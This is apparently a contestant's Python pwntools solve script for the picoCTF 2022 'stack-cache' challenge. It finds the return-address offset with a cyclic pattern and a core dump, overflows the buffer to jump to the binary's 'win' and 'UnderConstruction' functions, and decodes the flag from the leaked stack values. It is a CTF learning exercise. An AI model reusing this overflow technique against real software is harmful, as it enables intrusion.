#!/usr/bin/env python3
"""
WhatTheFuzz's submission for the picoCTF 2022 challenge stack-cache.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

import re
from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

NUM_CYCLIC_BYTES = 200


def conn():
    '''Establish the connection to the process, local or remote.
    '''

    # This remote will likely not work for you, as the instance closes after
    # thirty minutes.
    if args.get('REMOTE'):
        io = remote('saturn.picoctf.net', 53767)

    else:
        io = process([exe.path])

        if args.get('DEBUG'):
            pid = gdb.attach(io)

    return io


def get_offset():
    '''Return the offset to the flag.
    '''

    # Open the local process.
    conn = process([exe.path])

    # Create a cyclic pattern.
    pattern = cyclic(NUM_CYCLIC_BYTES)

    # Send it to the process, which should cause a fault.
    conn.sendline(pattern)
    conn.wait()

    # Open the coredump.
    core = conn.corefile

    fault = core.fault_addr
    assert p32(fault) in pattern, 'Fault address not found in cyclic pattern.'

    # Get the offset to the return address.
    offset = cyclic_find(p32(fault))
    return offset


def main():
    '''Return the flag.
    '''

    # Get the offset to the return address inside of `vuln`.
    offset = get_offset()
    log.info(f'Offset to return address: {offset}')

    # Find the address of the function `UnderConstruction`.
    under_construction = exe.symbols['UnderConstruction']
    win = exe.symbols['win']
    log.info(f'Address of `UnderConstruction`: {hex(under_construction)}')
    log.info(f'Address of `win`: {hex(win)}')

    payload = fit({
        offset: p32(win),
        offset + len(p32(win)): p32(under_construction)
    })

    # Run `UnderConstruction`.
    with conn() as io:

        io.sendlineafter(b'Give me a string that gets you the flag', payload)

        # Parse the output.

        # Ignore the first line.
        buf = io.recvall()

        # Split the line on each space.
        buf = buf.replace(b'\n', b' ')
        buf = buf.split(b' ')

        flag = b''
        for i in buf:
            try:
                # Convert to integer.
                j = int(i, base=16)
                # Convert to string.
                flag = p32(j, endian='little') + flag
            except:
                pass

        flag = re.search(b'picoCTF{(.*)}', flag).group(0)
        log.success(f'Flag: {flag}')
        return flag


if __name__ == '__main__':
    main()
